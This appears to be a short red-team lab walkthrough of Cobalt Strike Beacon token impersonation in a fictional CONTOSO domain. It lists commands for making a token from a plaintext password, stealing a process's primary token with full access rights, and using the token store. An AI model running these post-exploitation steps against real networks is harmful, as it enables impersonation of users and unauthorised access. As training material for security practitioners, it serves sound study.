### Token Impersonation

## Make Token

1.  From the medium-integrity Beacon, create and impersonate an access token for rsteel.
    
    1. make_token CONTOSO\rsteel Passw0rd!
2.  Drop the impersonation.
    
    1. rev2self

## Steal Token

1.  From the high-integrity Beacon, open the Process Browser.
    
    1. process_browser
2.  Select a process owned by rsteel.
    
3.  Steal the primary access token of that process and add it to the token store.
    
    1. Click **Steal Token**.
    2. Mask Type: TOKEN_ALL_ACCESS
    3. Store: true
4.  Impersonate that token.
    
    1. Run token-store use 0 from the Beacon console.
5.  Drop the impersonation.
    
    1. rev2self
6.  Remove the token from the store.
    
    1. token-store remove 0